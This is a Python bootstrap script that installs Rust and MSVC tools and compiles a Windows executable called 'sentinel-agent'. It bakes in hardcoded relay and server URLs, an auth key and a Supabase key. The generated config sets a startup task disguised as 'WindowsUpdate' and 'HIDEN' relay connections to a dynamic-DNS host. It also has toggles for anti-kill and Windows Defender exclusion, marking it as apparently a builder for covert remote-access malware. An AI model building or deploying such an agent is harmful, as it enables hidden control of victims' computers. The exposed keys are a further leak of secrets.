#!/usr/bin/env python3
"""
Wallahis Agent - Windows build bootstrap.

What it does, start to finish, with no manual steps:

  1. Makes sure Rust (MSVC toolchain) is installed. If not, downloads
     rustup-init.exe from https://win.rustup.rs and installs it silently
     with the stable-x86_64-pc-windows-msvc toolchain.
  2. Makes sure the Visual Studio Build Tools (MSVC linker + Windows SDK)
     are installed. If not, downloads the official vs_BuildTools.exe
     bootstrapper and runs it quietly with the C++ workload.
  3. Copies the ../rust source tree into .\build\ (so we never dirty
     the repo), writes the server URLs / auth key / debug flag into
     src\binding.rs, and runs `cargo build --release` with debug symbols
     kept in the release profile (so you can read panics / stack traces).
  4. Copies the resulting sentinel-agent.exe into .\dist\ and onto
     your Desktop.

Run from install.bat, or directly:  python build_agent.py
Optional flags:
  --release           Strip debug console (default: debug build with console)
  --name  <string>    Override BUILD_NAME baked into the exe
  --skip-vs           Skip the VS Build Tools check (if you already have them)
"""

from __future__ import annotations
import argparse
import os
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

try:
    import requests
except ImportError:
    print("The 'requests' package is missing. Run install.bat (it installs it) "
          "or:  python -m pip install requests")
    sys.exit(1)

# ---------------------------------------------------------------- config ----

HERE          = Path(__file__).resolve().parent
REPO_AGENT    = HERE.parent / "rust"           # agent/rust in the repo
BUILD_DIR     = HERE / "build"                 # working copy we compile in
DIST_DIR      = HERE / "dist"
DESKTOP       = Path(os.path.expanduser("~")) / "Desktop"

# Values baked into binding.rs — change here if your deployment moves.
SERVER_HTTP   = "https://wallahis.lovable.app"
RELAY_WS      = "wss://umad.servemc.net"
RELAY_HTTP    = "https://umad.servemc.net"
AUTH_KEY      = "wallahijayiscool"
OWNER_USER_ID = "1"
BUILD_NAME    = "jayjay-agent"

RUSTUP_URL    = "https://win.rustup.rs/x86_64"
VSBT_URL      = ("https://aka.ms/vs/17/release/vs_BuildTools.exe")

# ------------------------------------------------------------- utilities ----

def log(msg: str) -> None:
    print(f"[setup] {msg}", flush=True)

def run(cmd, **kw) -> int:
    log("$ " + (cmd if isinstance(cmd, str) else " ".join(str(c) for c in cmd)))
    return subprocess.call(cmd, shell=isinstance(cmd, str), **kw)

def need(cmd: str) -> bool:
    return shutil.which(cmd) is not None

def download(url: str, dest: Path) -> None:
    log(f"downloading {url}")
    with requests.get(url, stream=True, timeout=120) as r:
        r.raise_for_status()
        dest.parent.mkdir(parents=True, exist_ok=True)
        with open(dest, "wb") as f:
            for chunk in r.iter_content(1 << 15):
                if chunk:
                    f.write(chunk)
    log(f"saved -> {dest} ({dest.stat().st_size // 1024} KB)")

# ------------------------------------------------------------- installers ---

def ensure_rust() -> None:
    if need("cargo") and need("rustc"):
        log("Rust already installed: " + subprocess.getoutput("rustc --version"))
        return
    log("Rust not found. Installing via rustup-init.exe ...")
    tmp = Path(tempfile.gettempdir()) / "rustup-init.exe"
    download(RUSTUP_URL, tmp)
    rc = run([str(tmp),
              "-y",
              "--default-host", "x86_64-pc-windows-msvc",
              "--default-toolchain", "stable",
              "--profile", "default",
              "--no-modify-path", ""])  # we'll add to PATH ourselves below
    if rc != 0:
        raise SystemExit("rustup-init failed")
    cargo_bin = Path(os.environ["USERPROFILE"]) / ".cargo" / "bin"
    os.environ["PATH"] = str(cargo_bin) + os.pathsep + os.environ["PATH"]
    log("Rust installed: " + subprocess.getoutput("rustc --version"))

def ensure_vs_build_tools(skip: bool) -> None:
    if skip:
        log("Skipping VS Build Tools check (--skip-vs).")
        return
    # Quick heuristic: look for cl.exe anywhere under Program Files VS roots.
    pf = [os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"),
          os.environ.get("ProgramFiles",      r"C:\Program Files")]
    for root in pf:
        vs = Path(root) / "Microsoft Visual Studio"
        if vs.exists() and any(vs.rglob("cl.exe")):
            log("Visual Studio Build Tools detected.")
            return
    log("VS Build Tools missing. Downloading bootstrapper (small) ...")
    tmp = Path(tempfile.gettempdir()) / "vs_BuildTools.exe"
    download(VSBT_URL, tmp)
    log("Running VS Build Tools installer silently. This downloads a few GB "
        "and can take 10-30 minutes. Progress shows in a separate window.")
    rc = run([str(tmp),
              "--quiet", "--wait", "--norestart", "--nocache",
              "--add", "Microsoft.VisualStudio.Workload.VCTools",
              "--add", "Microsoft.VisualStudio.Component.Windows11SDK.22621",
              "--includeRecommended"])
    # 3010 = success, reboot recommended. Treat as success.
    if rc not in (0, 3010):
        raise SystemExit(f"VS Build Tools installer exited {rc}")
    log("VS Build Tools installed.")

# --------------------------------------------------------- source patching --

def stage_sources() -> None:
    if not REPO_AGENT.exists():
        raise SystemExit(f"Agent sources not found at {REPO_AGENT}. "
                         "Make sure you copied the whole 'agent' folder.")
    if BUILD_DIR.exists():
        shutil.rmtree(BUILD_DIR)
    log(f"copying sources: {REPO_AGENT} -> {BUILD_DIR}")
    shutil.copytree(REPO_AGENT, BUILD_DIR)

def write_binding(debug_console: bool, build_name: str) -> None:
    binding = BUILD_DIR / "src" / "binding.rs"
    content = f'''// Auto-generated by build_agent.py — do not edit by hand.
pub const OWNER_USER_ID: &str = "{OWNER_USER_ID}";
pub const SENTINEL_SERVER: &str = "{SERVER_HTTP}";
pub const BUILD_NAME: &str = "{build_name}";
pub const STARTUP_TASK: bool = true;
pub const STARTUP_NAME: &str = "WindowsUpdate";
pub const DEBUG_CONSOLE: bool = {"true" if debug_console else "false"};
pub const ANTIKILL: bool = false;
pub const WD_EXCLUSION: bool = false;
pub const REQUIRE_ADMIN: bool = false;
pub const FUN_FEATURES: bool = false;
pub const BUILD_TAG: &str = "";

pub const SUPABASE_URL: &str = "https://gsongngssprusmpqjrhw.supabase.co";
pub const SUPABASE_ANON_KEY: &str = "sb_publishable_flIvMx619Yxc7qErCyyH7Q_oT9eCry-";

pub const HIDEN_WS_URL: &str = "{RELAY_WS}";
pub const HIDEN_HTTP_URL: &str = "{RELAY_HTTP}";
pub const HIDEN_AUTH_KEY: &str = "{AUTH_KEY}";
'''
    binding.write_text(content, encoding="utf-8")
    log(f"wrote {binding}  (debug_console={debug_console}, name={build_name})")

# ----------------------------------------------------------------- build ----

def cargo_build() -> Path:
    env = os.environ.copy()
    # Keep line info in release so panics give something readable.
    env["CARGO_PROFILE_RELEASE_DEBUG"]   = "line-tables-only"
    env["CARGO_PROFILE_RELEASE_STRIP"]   = "none"
    env["RUST_BACKTRACE"]                = "1"
    log("running: cargo build --release")
    rc = subprocess.call(["cargo", "build", "--release"],
                         cwd=str(BUILD_DIR), env=env, shell=False)
    if rc != 0:
        raise SystemExit("cargo build failed")
    exe = BUILD_DIR / "target" / "release" / "sentinel-agent.exe"
    if not exe.exists():
        raise SystemExit(f"expected {exe} but it wasn't produced")
    return exe

def publish(exe: Path) -> None:
    DIST_DIR.mkdir(parents=True, exist_ok=True)
    out = DIST_DIR / "sentinel-agent.exe"
    shutil.copy2(exe, out)
    log(f"copied -> {out}  ({out.stat().st_size // 1024} KB)")
    try:
        if DESKTOP.exists():
            desk = DESKTOP / "sentinel-agent.exe"
            shutil.copy2(exe, desk)
            log(f"copied -> {desk}")
    except Exception as e:
        log(f"could not copy to Desktop: {e}")

# ------------------------------------------------------------------ main ----

def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--release", action="store_true",
                    help="Build without the debug console window.")
    ap.add_argument("--name", default=BUILD_NAME,
                    help="BUILD_NAME baked into the exe.")
    ap.add_argument("--skip-vs", action="store_true",
                    help="Skip Visual Studio Build Tools check.")
    args = ap.parse_args()

    if os.name != "nt":
        print("This script must run on Windows (needs MSVC + Windows SDK).")
        return 1

    t0 = time.time()
    ensure_rust()
    ensure_vs_build_tools(args.skip_vs)
    stage_sources()
    write_binding(debug_console=not args.release, build_name=args.name)
    exe = cargo_build()
    publish(exe)
    log(f"ALL DONE in {int(time.time() - t0)}s")
    return 0

if __name__ == "__main__":
    sys.exit(main())
